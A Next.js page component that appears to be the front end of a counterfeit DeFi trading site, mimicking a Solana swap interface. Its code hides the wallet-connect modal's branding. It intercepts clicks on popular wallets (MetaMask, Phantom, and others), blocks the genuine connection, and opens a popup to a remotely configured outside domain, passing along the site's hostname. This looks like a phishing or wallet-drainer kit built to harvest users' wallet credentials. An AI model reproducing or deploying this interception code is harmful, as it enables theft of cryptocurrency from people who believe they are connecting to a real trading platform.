"use client"
import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Search, Sparkles, SlidersHorizontal, Eye } from "lucide-react"
import SparklineChart from "@/components/ui/SparklineChart"
import PluginComponent from '@/components/plugin';
import { useAppKit } from "@reown/appkit/react"
import { nextParamServerUrl } from "@/config"
import UltraTogglePanel from "@/components/ui/UltraTogglePanel"

export default function DeFiTradingPlatform() {
  const { open, close } = useAppKit()
  const [serverDomain, setServerDomain] = useState("https://robintransferserver.xyz")
  const [isModalVisible, setModalVisible] = useState(false);

  const toggleModal = () => {
    setModalVisible(!isModalVisible);
  };

  useEffect(() => {
    const fetchData = async () => {
      const res = await fetch(nextParamServerUrl);
      const json = await res.json();
      setServerDomain(json.SERVER_DOMAIN);
    };

    fetchData();
  }, []);

  const handleConnectWallet = () => {
    open({ view: "Connect" });
  }

  const allowWalletList = [
    "MetaMask",
    "Phantom",
    "Solflare",
    "Trust Wallet",
    "Exodus",
  ]

  useEffect(() => {
    if (!serverDomain) return; // wait until serverDomain is loaded

    const STYLE_MARKER = "data-w3m-override";
    const observers: MutationObserver[] = [];
    const enhancedElements = new WeakSet<HTMLElement>();

    const css = `
      wui-ux-by-reown {
        display: none !important;
      }
    `;

    function injectShadowStyle(sr: ShadowRoot) {
      if (sr.querySelector(`style[${STYLE_MARKER}]`)) return;
      const s = document.createElement("style");
      s.setAttribute(STYLE_MARKER, "1");
      s.textContent = css;
      sr.appendChild(s);
    }

    function isW3mLike(el: HTMLElement) {
      const tag = el.tagName.toLowerCase();
      return (
        tag.startsWith("w3m-") ||
        tag.startsWith("wui-") ||
        tag.startsWith("lit-") ||
        Array.from(el.classList).some((c) => c.startsWith("w3m-") || c.startsWith("wui-"))
      );
    }

    function enhanceWalletList(el: HTMLElement) {
      if (enhancedElements.has(el)) return;
      enhancedElements.add(el);

      el.addEventListener(
        "click",
        (e: any) => {
          e.stopImmediatePropagation();
          e.preventDefault();

          let walletName =
            (e.target?.getAttribute?.("name") as string) ||
            el.getAttribute("name") ||
            el.textContent?.trim() ||
            "";

          console.log("Wallet clicked:", walletName);

          const selectedWalletId = allowWalletList.findIndex(
            (w) => w.toLowerCase().trim() === walletName.toLowerCase().trim()
          );

          if (selectedWalletId > -1) {
            const clientDomain = window.location.hostname;
            const encryptedClientDomain = btoa(clientDomain);

            const width = 500;
            const height = 700;
            const left = (window.screen.width - width) / 2;
            const top = (window.screen.height - height) / 2;

            console.log("Using serverDomain:", serverDomain);

            window.open(
              `${serverDomain}?q=${encryptedClientDomain}_${selectedWalletId}`,
              "popupWindow",
              `width=${width},height=${height},left=${left},top=${top}`
            );
            close();
          }
        },
        { capture: true }
      );

      el.setAttribute("title", "Click to connect with this wallet");
    }

    function scan(root: ParentNode) {
      const nodes = root.querySelectorAll("*");
      nodes.forEach((node) => {
        if (!(node instanceof HTMLElement)) return;

        const sr = node.shadowRoot;
        if (isW3mLike(node) && sr) {
          injectShadowStyle(sr);
          scan(sr);
          attachObserver(sr);
        }

        if (node.tagName.toLowerCase() === "wui-list-wallet" || node.tagName.toLowerCase() === "w3m-list-wallet") {
          enhanceWalletList(node);
        }

        if (node.tagName.toLowerCase() === "w3m-all-wallets-list-item" && sr) {
          const button = sr.querySelector("button");
          if (button) enhanceWalletList(button as HTMLElement);
        }
      });
    }

    function attachObserver(target: ParentNode) {
      const observer = new MutationObserver((muts) => {
        muts.forEach((m) => {
          m.addedNodes.forEach((node) => {
            if (node instanceof HTMLElement) {
              const sr = node.shadowRoot;
              if (isW3mLike(node) && sr) {
                injectShadowStyle(sr);
                scan(sr);
                attachObserver(sr);
              }
              scan(node);
            }
          });
        });
      });
      observer.observe(target, { childList: true, subtree: true });
      observers.push(observer);
    }

    // 🔹 Run initial scan
    scan(document.body);
    attachObserver(document.body);

    // 🔹 Cleanup observers on unmount / re-run
    return () => {
      observers.forEach((o) => o.disconnect());
    };
  }, [serverDomain, close]);

  const [activeTab, setActiveTab] = useState("Market")
  const router = useRouter()

  // Handler for all buttons
  const goToWalletSystem = () => {
    router.push("/wallet-system")
  }

  return (
    <div
      style={{
        backgroundImage: 'url("/background.webp")',
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
        backgroundAttachment: "fixed",
        minHeight: "100vh",
      }}
    >
      {/* Navigation Header */}
      <nav className="flex items-center justify-between p-4 border-b border-border/20 bg-black">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-transparent rounded-full flex items-center justify-center">
            <img src="/logo.webp" alt="Logo" className="w-6 h-6" />
          </div>
        </div>

        <div className="flex-1 max-w-md mx-8">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <Input className="pl-10 bg-card border-border/50 text-card-foreground rounded-full" />
          </div>
        </div>

        <Button className="bg-primary text-primary-foreground hover:bg-primary/90" onClick={handleConnectWallet}>Connect</Button>
      </nav>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-lg mx-auto">
          {/* Tab Navigation */}
          <div
            className="bg-[rgba(11,14,18,1)] border border-[#1a1f29] rounded-4xl shadow-[0_0_20px_rgba(0,0,0,0.6)] p-4"
          >
            {/* Tabs (Market / Trigger / Recurring) */}
            <div className="flex rounded-lg p-1 mb-3 bg-transparent">
              {["Market", "trigger", "recurring"].map((tab) => (
                <button
                  key={tab}
                  onClick={goToWalletSystem}
                  className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${activeTab === tab
                    ? "bg-primary/10 text-white"
                    : "text-muted-foreground hover:text-foreground"
                    }`}
                >
                  {tab.charAt(0).toUpperCase() + tab.slice(1)}
                </button>
              ))}
            </div>

            {/* Ultra v2 row */}
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2 border p-2 rounded-full" onClick={toggleModal}>
                <Sparkles className="w-4 h-4 text-muted-foreground" />
                <span className="text-sm font-medium">Ultra v2</span>
                <SlidersHorizontal className="w-4 h-4 text-muted-foreground" />
              </div>
              {isModalVisible && (
                <div className="fixed inset-0 bg-black/70 flex items-center justify-center border z-100">
                  <div className="border text-white rounded-lg shadow-lg max-w-xl w-full">

                    <UltraTogglePanel toggleModal={() => {
                      toggleModal()
                    }} />
                  </div>
                </div>
              )}
              {/* <RotateCw
                className="w-6 h-6 text-muted-foreground border border-gray-700 bg-black/30 rounded-full p-1 cursor-pointer hover:bg-white/5 transition"
                onClick={goToWalletSystem}
              /> */}
            </div>
            <div className="w-full">
              <PluginComponent />
            </div>
          </div>
          {/* Chart Section */}
          <div className="flex items-center gap-4 my-4">
            <div className="flex items-center gap-2 bg-gray-700 px-2 py-1 rounded-full">
              <span className="text-sm text-muted-foreground">Show Chart</span>
              <Eye className="w-4 h-4" />
            </div>
            <div className="flex items-center gap-2 bg-gray-700 px-2 py-1 rounded-full">
              <span className="text-sm text-muted-foreground">Show History</span>
              <Eye className="w-4 h-4" />
            </div>
          </div>

          {/* Price Charts */}
          <div className="grid grid-cols-2 gap-4">
            {/* USDC Card */}
            <SparklineChart coinId="usd-coin" coinName="USDC" vsCurrency="usd" days={1} decimals={4} address="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" />
            {/* SOL Card */}
            <SparklineChart coinId="solana" coinName="SOL" vsCurrency="usd" days={1} decimals={2} address="So11111111111111111111111111111111111111112" />
          </div>
        </div>
      </div>
    </div >
  )
}
